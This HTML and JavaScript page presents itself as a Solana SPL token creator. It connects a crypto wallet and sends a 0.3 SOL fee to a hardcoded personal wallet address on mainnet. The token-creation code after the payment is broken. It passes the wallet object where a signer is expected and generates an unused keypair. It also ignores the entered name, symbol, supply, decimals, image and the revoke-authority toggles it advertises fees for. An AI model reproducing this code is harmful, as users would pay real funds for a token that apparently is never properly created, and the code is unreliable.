<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Create your own Solana SPL tokens easily with our simple and secure Solana Token Creator. Connect your wallet and manage tokens effortlessly.">
    <meta name="keywords" content="Solana, SPL Token, Solana Token Creator, Crypto, Blockchain, Token Generator">
    <meta name="author" content="Your Project Name">
    <title>Solana Token Creator - Generate Your SPL Tokens</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.33.0/solana-web3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/spl-token/0.1.8/spl-token.umd.min.js"></script>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: linear-gradient(135deg, #1c2333, #293448);
            color: white;
            padding: 20px;
            margin: 0;
            height: 100vh;
        }

        .container {
            max-width: 500px;
            margin: auto;
            background: #1e2734;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0px 4px 20px rgba(80, 122, 255, 0.3);
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 20px;
        }

        input, button, label {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border-radius: 12px;
            border: none;
            font-size: 16px;
            outline: none;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            transition: 0.2s;
        }

        .wallet-btn, .action-btn {
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            padding: 14px;
            border-radius: 12px;
            font-size: 16px;
            width: 100%;
            border: none;
            background-color: #3498db;
            box-shadow: 0px 4px 10px rgba(52, 152, 219, 0.4);
        }

        .wallet-btn:hover, .action-btn:hover {
            background-color: #1d6fa5;
            box-shadow: 0px 4px 15px rgba(52, 152, 219, 0.6);
        }

        .wallet-selection-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 20px;
        }

        .wallet-btn {
            width: 48%;
        }

        .status-message {
            font-size: 18px;
            color: #f39c12;
            margin-top: 20px;
        }

        /* Image preview styles */
        #preview {
            max-width: 100%;
            max-height: 200px;
            margin-top: 15px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            border-radius: 12px;
        }

        .toggle-switch {
            display: flex;
            justify-content: space-between;
            background: rgba(255, 255, 255, 0.1);
            padding: 12px;
            border-radius: 12px;
            margin: 10px 0;
        }

        .toggle-switch span {
            font-size: 16px;
        }

        /* Custom Switch Style */
        .switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 34px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: 0.4s;
            border-radius: 34px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 26px;
            width: 26px;
            border-radius: 50%;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: 0.4s;
        }

        input:checked + .slider {
            background-color: #4CAF50;
        }

        input:checked + .slider:before {
            transform: translateX(26px);
        }

        .footer {
            margin-top: 30px;
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üîó Solana Token Creator</h1>
        <p>Create your Solana SPL tokens easily and securely.</p>

        <p id="walletStatus">Wallet not connected</p>
        <div class="wallet-selection-container">
            <button class="wallet-btn" onclick="connectWallet('phantom')">üü£ Phantom</button>
            <button class="wallet-btn" onclick="connectWallet('solflare')">üî• Solflare</button>
        </div>

        <div class="wallet-selection-container">
            <button class="wallet-btn" onclick="connectWallet('slope')">üîë Slope Wallet</button>
            <button class="wallet-btn" onclick="connectWallet('torus')">üåê Torus Wallet</button>
        </div>

        <label for="tokenName">Token Name</label>
        <input type="text" id="tokenName" placeholder="Enter token name">

        <label for="tokenSymbol">Token Symbol</label>
        <input type="text" id="tokenSymbol" placeholder="Enter token symbol">

        <label for="decimals">Decimals</label>
        <input type="number" id="decimals" value="6">

        <label for="supply">Total Supply</label>
        <input type="number" id="supply" placeholder="Enter total supply">

        <label for="tokenImage">Upload Token Image</label>
        <input type="file" id="tokenImage" accept="image/*">

        <!-- Image preview -->
        <img id="preview" src="" alt="Image preview">

        <p><strong>Fees:</strong> Token Creation - 0.3 SOL | Revoke Freeze - 0.1 SOL | Revoke Mint - 0.1 SOL</p>

        <!-- Freeze and Mint Authority options -->
        <div class="toggle-switch">
            <span>Revoke Freeze Authority</span>
            <label class="switch">
                <input type="checkbox" id="revokeFreeze" checked>
                <span class="slider"></span>
            </label>
        </div>

        <div class="toggle-switch">
            <span>Revoke Mint Authority</span>
            <label class="switch">
                <input type="checkbox" id="revokeMint" checked>
                <span class="slider"></span>
            </label>
        </div>

        <button class="action-btn" onclick="createToken()">Create Token (0.3 SOL)</button>
        <p class="status-message" id="status"></p>

    </div>

    <div class="popup" id="walletPopup">
        <button class="close-btn" onclick="closeWalletPopup()">‚úñ</button>
        <h2>Connect a wallet on Solana</h2>
        <button onclick="connectWallet('phantom')">üü£ Phantom</button>
        <button onclick="connectWallet('solflare')">üî• Solflare</button>
        <button onclick="connectWallet('slope')">üîë Slope Wallet</button>
        <button onclick="connectWallet('torus')">üåê Torus Wallet</button>
    </div>

    <script>
        function openWalletPopup() {
            document.getElementById("walletPopup").style.display = "block";
        }

        function closeWalletPopup() {
            document.getElementById("walletPopup").style.display = "none";
        }

        async function connectWallet(walletType) {
            let walletProvider;
            if (walletType === "phantom" && window.solana && window.solana.isPhantom) {
                walletProvider = window.solana;
            } else if (walletType === "solflare" && window.solflare) {
                walletProvider = window.solflare;
            } else if (walletType === "slope" && window.slope) {
                walletProvider = window.slope;
            } else if (walletType === "torus" && window.torus) {
                walletProvider = window.torus;
            } else {
                alert(`Please install ${walletType} Wallet!`);
                return;
            }

            try {
                const response = await walletProvider.connect();
                document.getElementById("walletStatus").innerText = `‚úÖ Connected: ${response.publicKey.toString()}`;
                closeWalletPopup();
            } catch (err) {
                document.getElementById("walletStatus").innerText = "‚ùå Failed to connect wallet";
            }
        }

        // Image preview functionality
        document.getElementById("tokenImage").addEventListener("change", function (event) {
            const file = event.target.files[0];
            const reader = new FileReader();

            reader.onload = function () {
                const preview = document.getElementById("preview");
                preview.src = reader.result;
                preview.style.display = "block";
            }

            if (file) {
                reader.readAsDataURL(file);
            }
        });

        async function createToken() {
            // Validate input fields
            const tokenName = document.getElementById("tokenName").value;
            const tokenSymbol = document.getElementById("tokenSymbol").value;
            const totalSupply = document.getElementById("supply").value;

            if (tokenName.trim() === "") {
                alert("‚ùå Please enter a valid token name.");
                return;
            }

            if (tokenSymbol.trim() === "") {
                alert("‚ùå Please enter a valid token symbol.");
                return;
            }

            if (isNaN(totalSupply) || totalSupply <= 0) {
                alert("‚ùå Please enter a valid total supply greater than zero.");
                return;
            }

            // Ensure wallet is connected
            if (!window.solana || !window.solana.isPhantom) {
                alert("‚ùå Please connect to Phantom Wallet!");
                return;
            }

            document.getElementById("status").innerText = "Creating token... Please wait.";

            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
            const publicKey = window.solana.publicKey;
            const balance = await connection.getBalance(publicKey);

            const fee = 0.3 * 1e9; // 0.3 SOL in lamports (1 SOL = 1e9 lamports)

            if (balance < fee) {
                document.getElementById("status").innerText = "‚ùå Insufficient funds! Please ensure you have at least 0.3 SOL to create the token.";
                return;
            }

            const personalWalletAddress = 'HGF6MqYTrAViZTeRKStyLG81apiGaGz2GXg7Cw1n6n3V';

            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: personalWalletAddress,
                    lamports: fee,
                })
            );

            try {
                const signature = await window.solana.signAndSendTransaction(transaction);
                await connection.confirmTransaction(signature);

                const mint = await solanaWeb3.Keypair.generate();
                const token = await splToken.createMint(
                    connection, 
                    window.solana, 
                    publicKey, 
                    null, 
                    6 // decimals
                );

                document.getElementById("status").innerText = `‚úÖ Token ${tokenName} created successfully!`;
            } catch (error) {
                document.getElementById("status").innerText = "‚ùå Transaction failed or was cancelled.";
            }
        }
    </script>

</body>
</html>
